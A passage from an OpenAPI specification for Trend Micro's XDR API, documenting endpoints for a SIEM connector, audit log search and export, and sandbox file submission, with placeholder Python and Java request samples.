            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/metadata/status\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"enabled\\\": \\\"YOUR_ENABLED (boolean)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.put(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/portal/siem": {
      "get": {
        "tags": [
          "Splunk"
        ],
        "summary": "Get Splunk connector information",
        "description": "Retrieves information used to configure the Splunk connector\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Third-party Integration</b><br>\n  <ul>\n    <li>View</li>\n    <li>Configure settings</li>\n  </ul>\n\n</div>\n",
        "parameters": [],
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "code",
                    "data",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "default": "Operation success"
                    },
                    "data": {
                      "required": [
                        "authenticationToken",
                        "endpointUrl"
                      ],
                      "type": "object",
                      "properties": {
                        "endpointUrl": {
                          "type": "string"
                        },
                        "authenticationToken": {
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/siem'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/siem\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/portal/auditLog/search": {
      "get": {
        "tags": [
          "Audit Logs"
        ],
        "summary": "Search audit logs",
        "description": "Retrieves a list of log entries that match specified criteria\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Audit Logs</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n  </ul>\n\n</div>\n",
        "parameters": [
          {
            "name": "pageIndex",
            "in": "query",
            "description": "Page index of audit log query result in paginated format\n",
            "schema": {
              "minimum": 1,
              "type": "integer",
              "format": "int32",
              "default": 1
            }
          },
          {
            "name": "pageSize",
            "in": "query",
            "description": "Number of audit log returned in each page\n",
            "schema": {
              "type": "integer",
              "format": "int32",
              "default": 20
            }
          },
          {
            "name": "period",
            "in": "query",
            "description": "Filter log from 30/90/120/180 days ago",
            "required": true,
            "schema": {
              "type": "integer"
            }
          },
          {
            "name": "accessType",
            "in": "query",
            "description": "Filter log for certain access type\n* 0 - Console\n* 1 - API\n* 9 - All\n",
            "required": true,
            "schema": {
              "type": "integer"
            }
          },
          {
            "name": "categories",
            "in": "query",
            "description": "Filter log for certain categories, format \"01|02|03\", categories definition is as following\n* 01 - Logon * 02 - Single Sign-On * 03 - Account Management * 04 - Product Connector * 05 - SIEM Connector * 06 - Detection Model Management * 07 - Workbench * 08 - Response * 09 - Search * 0c - Mobile Security * 0d - Network Inventory * 11 - Third-party Integration\n",
            "required": true,
            "schema": {
              "type": "string"
            }
          },
          {
            "name": "detail",
            "in": "query",
            "description": "Filter for log username/code/details info",
            "required": true,
            "schema": {
              "type": "string"
            }
          },
          {
            "name": "sort",
            "in": "query",
            "description": "Sort log ascending or descending\n",
            "schema": {
              "type": "string",
              "enum": [
                "asc",
                "desc"
              ],
              "default": "desc"
            }
          }
        ],
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "code",
                    "data",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "description": "One of a server-defined set of codes",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "description": "A human-readable representation of the code"
                    },
                    "data": {
                      "required": [
                        "items",
                        "totalCounts"
                      ],
                      "type": "object",
                      "properties": {
                        "totalCounts": {
                          "type": "integer",
                          "description": "Total counts of query results by the filters"
                        },
                        "items": {
                          "type": "array",
                          "items": {
                            "required": [
                              "access",
                              "activity",
                              "category",
                              "details",
                              "result",
                              "role",
                              "user"
                            ],
                            "type": "object",
                            "properties": {
                              "loggedTime": {
                                "type": "string",
                                "description": "The operation time",
                                "format": "dataTime"
                              },
                              "user": {
                                "type": "string",
                                "description": "The logged user name"
                              },
                              "role": {
                                "type": "string",
                                "description": "Role type of the logged user"
                              },
                              "access": {
                                "type": "number",
                                "description": "Access source definition\n* 0 - Console\n* 1 - API\n"
                              },
                              "category": {
                                "type": "string",
                                "description": "Category definition code\n* 01 - Logon\n* 02 - Single Sign-On\n* 03 - Account Management\n* 04 - Product Connector\n* 05 - SIEM Connector\n* 06 - Detection Model Management\n* 07 - Workbench\n* 08 - Response\n* 09 - Search\n* 0c - Mobile Security\n* 0d - Network Inventory\n* 11 - Third-party Integration\n"
                              },
                              "activity": {
                                "type": "string",
                                "description": "Actiivity definition code based on category code\n\nCategory 01\n* 01 - Log on\n* 02 - Log off\n\nCategory 02\n* 01 - Enable single sign-on\n* 02 - Disable single sign-on\n\nCategory 03\n* 01 - Add user account\n* 02 - Delete user account\n* 03 - Enable user account\n* 04 - Disable user account\n* 05 - Reset password\n* 06 - Change role\n* 07 - Change access level\n\nCategory 04\n* 01 - Connect product\n* 02 - Unregister product\n\nCategory 05\n* 01 - Copy SIEM authentication token\n* 02 - Add email notifications\\' recipient\n* 03 - Send test message\n\nCategory 06\n* 01 - Enable detection model\n* 02 - Disable detection model\n* 03 - Remove exception\n\nCategory 07\n* 01 - Modify alert details\n* 02 - Add exception\n\nCategory 08\n* 01 - Create task: Isolate endpoint\n* 02 - Create task: Restore connection\n* 03 - Create task: Allow traffic\n* 04 - Create task: Terminate\n* 05 - Create task: Add to Block List\n* 06 - Create task: Remove from Block List\n* 07 - Create task: Collect file\n* 08 - Create task: Quarantine message\n* 09 - Create task: Delete message\n* 0a - Create task: Collect DDI Investigation Package\n* 0b - Download file\n* 10 - Remote shell\n\nCategory 09\n* 01 - RCA Generated\n* 02 - RCA Deleted\n\nCategory 0c\n* 01 - Invite user\n* 02 - Remove enrollment\n* 03 - Invite Azure AD group\n* 04 - Delete Azure AD group\n* 05 - Enroll device\n* 06 - Unenroll device\n* 07 - Create policy\n* 08 - Modify policy\n* 09 - Delete policy\n\nCategory 0d\n* 01 - Disconnect network sensor\n* 02 - Select product\n* 03 - Reset Network Inventory\n\nCategory 11\n* 01 - Add intelligence feed\n* 02 - Modify intelligence feed\n* 03 - Delete intelligence feed\n"
                              },
                              "result": {
                                "type": "boolean",
                                "description": "Operation result\n* true - Success\n* false - Failed\n"
                              },
                              "details": {
                                "type": "object",
                                "properties": {
                                  "ipAddr": {
                                    "type": "string",
                                    "description": "IP address"
                                  },
                                  "user": {
                                    "type": "string",
                                    "description": "User account"
                                  },
                                  "role": {
                                    "type": "string",
                                    "description": "Role"
                                  },
                                  "accessLevel": {
                                    "type": "integer",
                                    "description": "Access level"
                                  },
                                  "product": {
                                    "type": "string",
                                    "description": "Product"
                                  },
                                  "tmAccount": {
                                    "type": "string",
                                    "description": "Trend Micro account"
                                  },
                                  "hostName": {
                                    "type": "string",
                                    "description": "Host name"
                                  },
                                  "modelName": {
                                    "type": "string",
                                    "description": "Model name"
                                  },
                                  "wbName": {
                                    "type": "string",
                                    "description": "Workbench name"
                                  },
                                  "status": {
                                    "type": "string",
                                    "description": "Status"
                                  },
                                  "fileName": {
                                    "type": "string",
                                    "description": "File name"
                                  },
                                  "messageId": {
                                    "type": "string",
                                    "description": "Message ID"
                                  },
                                  "mailbox": {
                                    "type": "string",
                                    "description": "Mailbox"
                                  },
                                  "packageId": {
                                    "type": "string",
                                    "description": "Package ID"
                                  },
                                  "domain": {
                                    "type": "string",
                                    "description": "Domain"
                                  },
                                  "url": {
                                    "type": "string",
                                    "description": "URL"
                                  },
                                  "port": {
                                    "type": "integer",
                                    "description": "Port"
                                  },
                                  "sha1": {
                                    "type": "string",
                                    "description": "Sha1"
                                  }
                                },
                                "description": "Audit log detail info.\n"
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Bad argument",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "integer",
                          "enum": [
                            4000000
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Invalid Parameter"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "Internal server error",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "One of a server-defined set of codes\n* InternalServerError\n* DbError\n* DeleteServiceUrlFail\n* DeleteEMSConfiglFail\n* DeleteAuthNAPIKeyFail\n* PushProvisioningTaskFail\n* GenerateAuthNTokenFail\n* CLPServiceFail\n* SESServiceFail\n",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/auditLog/search'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {\n    'pageIndex': 'YOUR_PAGEINDEX (integer)',\n    'pageSize': 'YOUR_PAGESIZE (integer)',\n    'period': 'YOUR_PERIOD (integer)',\n    'accessType': 'YOUR_ACCESSTYPE (integer)',\n    'categories': 'YOUR_CATEGORIES (string)',\n    'detail': 'YOUR_DETAIL (string)',\n    'sort': 'YOUR_SORT (string)'\n}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/auditLog/search\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addParameter(\"pageIndex\", \"YOUR_PAGEINDEX (integer)\")\n                .addParameter(\"pageSize\", \"YOUR_PAGESIZE (integer)\")\n                .addParameter(\"period\", \"YOUR_PERIOD (integer)\")\n                .addParameter(\"accessType\", \"YOUR_ACCESSTYPE (integer)\")\n                .addParameter(\"categories\", \"YOUR_CATEGORIES (string)\")\n                .addParameter(\"detail\", \"YOUR_DETAIL (string)\")\n                .addParameter(\"sort\", \"YOUR_SORT (string)\")\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/portal/auditLog/exportCsv": {
      "get": {
        "tags": [
          "Audit Logs"
        ],
        "summary": "Export audit logs",
        "description": "Exports log entries that match specified criteria\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Audit Logs</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n    <li>Export And Download</li>\n  </ul>\n\n</div>\n",
        "parameters": [
          {
            "name": "pageIndex",
            "in": "query",
            "description": "Page index of audit log query result in paginated format\n",
            "schema": {
              "minimum": 1,
              "type": "integer",
              "format": "int32",
              "default": 1
            }
          },
          {
            "name": "pageSize",
            "in": "query",
            "description": "Number of audit log returned in each page\n",
            "schema": {
              "type": "integer",
              "format": "int32",
              "default": 20
            }
          },
          {
            "name": "period",
            "in": "query",
            "description": "Filter log from 30/90/120/180 days ago",
            "required": true,
            "schema": {
              "type": "integer"
            }
          },
          {
            "name": "accessType",
            "in": "query",
            "description": "Filter log for certain access type\n* 0 - Console\n* 1 - API\n* 9 - All\n",
            "required": true,
            "schema": {
              "type": "integer"
            }
          },
          {
            "name": "categories",
            "in": "query",
            "description": "Filter log for certain categories, format \"01|02|03\", categories definition is as following\n* 01 - Logon\n* 02 - Single Sign-On\n* 03 - Account Management\n* 04 - Product Connector\n* 05 - Alert Notifications\n* 06 - Detection Model Management\n* 07 - Workbench\n* 08 - Response\n* 09 - Search\n* 0b - Managed XDR\n* 0c - Mobile Security\n* 0d - Network Inventory\"\n* 11 - Third-party Integration\n* 13 - Service Gateway Inventory\n* 14 - Threat Intelligence\n* 1c - Endpoint Inventory\n* 1d - Security Configuration\n* 1b - Zero Trust Secure Access\n* 1e - Sandbox Analysis\n* 0e - OAT\n* 30 Security Playbooks\n",
            "required": true,
            "schema": {
              "type": "string"
            }
          },
          {
            "name": "detail",
            "in": "query",
            "description": "Filter for log username/code/details info",
            "required": true,
            "schema": {
              "type": "string"
            }
          },
          {
            "name": "sort",
            "in": "query",
            "description": "Sort log ascending or descending\n",
            "schema": {
              "type": "string",
              "enum": [
                "asc",
                "desc"
              ],
              "default": "desc"
            }
          }
        ],
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "text/csv": {
                "schema": {
                  "type": "string",
                  "description": "csv data."
                }
              }
            }
          },
          "400": {
            "description": "Bad Request",
            "content": {
              "application/json": {
                "schema": {
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "Error code",
                          "enum": [
                            "BadRequest"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "description": "A human-readable representation of the error code",
                          "example": "params error : \"pageIndex\" must be a number"
                        },
                        "innererror": {
                          "required": [
                            "code"
                          ],
                          "type": "object",
                          "properties": {
                            "code": {
                              "type": "string",
                              "description": "Error code",
                              "enum": [
                                "ParameterNotAccepted"
                              ]
                            },
                            "innererror": {
                              "type": "object",
                              "properties": {
                                "service": {
                                  "type": "string",
                                  "enum": [
                                    "uic"
                                  ]
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "Internal server error",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "One of a server-defined set of codes\n* InternalServerError\n* DbError\n* DeleteServiceUrlFail\n* DeleteEMSConfiglFail\n* DeleteAuthNAPIKeyFail\n* PushProvisioningTaskFail\n* GenerateAuthNTokenFail\n* CLPServiceFail\n* SESServiceFail\n",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/auditLog/exportCsv'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {\n    'pageIndex': 'YOUR_PAGEINDEX (integer)',\n    'pageSize': 'YOUR_PAGESIZE (integer)',\n    'period': 'YOUR_PERIOD (integer)',\n    'accessType': 'YOUR_ACCESSTYPE (integer)',\n    'categories': 'YOUR_CATEGORIES (string)',\n    'detail': 'YOUR_DETAIL (string)',\n    'sort': 'YOUR_SORT (string)'\n}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/auditLog/exportCsv\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addParameter(\"pageIndex\", \"YOUR_PAGEINDEX (integer)\")\n                .addParameter(\"pageSize\", \"YOUR_PAGESIZE (integer)\")\n                .addParameter(\"period\", \"YOUR_PERIOD (integer)\")\n                .addParameter(\"accessType\", \"YOUR_ACCESSTYPE (integer)\")\n                .addParameter(\"categories\", \"YOUR_CATEGORIES (string)\")\n                .addParameter(\"detail\", \"YOUR_DETAIL (string)\")\n                .addParameter(\"sort\", \"YOUR_SORT (string)\")\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/sandbox/file": {
      "post": {
        "tags": [
          "Sandbox Analysis"
        ],
        "summary": "Submit file to sandbox",
        "description": "Submits a file to the sandbox for analysis (Note. For more information about the supported file types, see the Trend Vision One Online Help. Submissions require credits. Does not require credits in regions where Sandbox Analysis has not been officially released.)\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Sandbox Analysis</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n    <li>Submit objects</li>\n  </ul>\n\n</div>\n",
        "requestBody": {
          "content": {
            "multipart/form-data": {
              "schema": {
                "type": "object",
                "properties": {
                  "file": {
                    "description": "File content to be upload.",
                    "type": "string",
                    "format": "binary"
                  },
                  "documentPassword": {
                    "description": "Indicate the password for decrypting the submitted document-type1 sample. The value must be Base64-encoded. The maximum password length is 128 bytes prior to encoding.",
                    "type": "string",
                    "format": "byte",
                    "maxLength": 128
                  },
                  "archivePassword": {
                    "description": "Indicate the password for decrypting the submitted archive-type1 sample. The value must be Base64-encoded. The maximum password length is 128 bytes prior to encoding.",
                    "type": "string",
                    "format": "byte",
                    "maxLength": 128
                  }
                },
                "required": [
                  "file"
                ]
              },
              "encoding": {
                "file": {
                  "contentType": "application/octet-stream"
                }
              }
            }
          }
        },
        "responses": {
          "202": {
            "description": "successful operation",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/sandbox-SubmitStatus"
                }
              }
            }
          },
          "400": {
            "description": "Bad request",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "BadRequest",
                          "description": "Error Code"
                        },
                        "message": {
                          "type": "string",
                          "example": "Invalid HTTP Request",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "409": {
            "description": "Conflict",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "Conflict",
                          "description": "Error Code"
                        },
                        "message": {
                          "type": "string",
                          "example": "Parameters or values are invalid",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "413": {
            "description": "PayloadTooLarge",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "PayloadTooLarge",
                          "description": "Error Code"
                        },
                        "message": {
                          "type": "string",
                          "example": "The submitted file size is larger than supported",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "429": {
            "description": "TooManyRequests",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "TooManyRequests",
                          "description": "Error Code"
                        },
                        "message": {
                          "type": "string",
                          "example": "The request has exceeded quota allowance",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "InternalError",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "InternalError",
                          "description": "Error Code"
                        },
                        "message": {
                          "type": "string",
                          "example": "Internal Server Error",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/sandbox/file'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\ndata = {\n    'documentPassword': 'YOUR_DOCUMENTPASSWORD (base64-encoded characters)',\n    'archivePassword': 'YOUR_ARCHIVEPASSWORD (base64-encoded characters)'\n}\nfiles = {\n    'file': ('YOUR_FILENAME (string)', open('YOUR_FILEPATH (string)', 'rb'), 'application/octet-stream')\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, data=data, files=files)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
